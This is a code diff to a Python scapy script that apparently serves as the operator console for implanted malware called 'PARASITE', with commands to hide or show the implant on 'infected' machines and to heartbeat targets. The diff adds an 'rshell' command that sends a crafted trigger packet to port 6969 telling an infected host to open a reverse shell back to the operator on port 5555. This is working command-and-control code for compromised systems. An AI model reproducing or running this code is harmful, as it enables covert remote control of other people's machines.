@@ -1,5 +1,6 @@
 from scapy.all import *
 import sys
+import socket
 
 RED = "\033[1;31m"
 MAGENTA = "\033[1;35m"
@@ -22,7 +23,7 @@ help = """\n
 [+] reload: Heartbeats all scope machines to refresh ls\n
 [+] showall: Sends PARASITE_SHOW to all active machines\n
 [+] hideall: Sends PARASITE_HIDE to all active machines\n
-[+] control or c: Enter control mode for infected box\n
+[+] rshell targetip: Send rshell command to targetip, must be listening for 5555 already\n
 [+] exit: Exit program\n
 """
 
@@ -74,6 +75,15 @@ def heartbeat(scope):
         inactive.append(i)
 
     return active, inactive
+
+
+def send_rshell(myip, ip):
+    pkt = IP(dst=ip)/TCP(dport=6969)/Raw(load='PARASITE_RSHELL' + str(myip))
+    resp = sr1(pkt, timeout=0.5)
+    if resp == None:
+        print("rshell packet sent to " + str(ip) + "!\n")
+    else:
+        print("rshell shit for " + str(ip))
         
 
 def main():
@@ -101,6 +111,8 @@ def main():
             print_scope(curr_active, curr_inactive)
         if cmd == "reload":
             curr_active, curr_inactive = heartbeat(scope)
+        if cmd.split()[0] == "rshell":
+            send_rshell(socket.gethostbyname(socket.gethostname()), cmd.split()[1])
 
 
 if __name__ == "__main__":
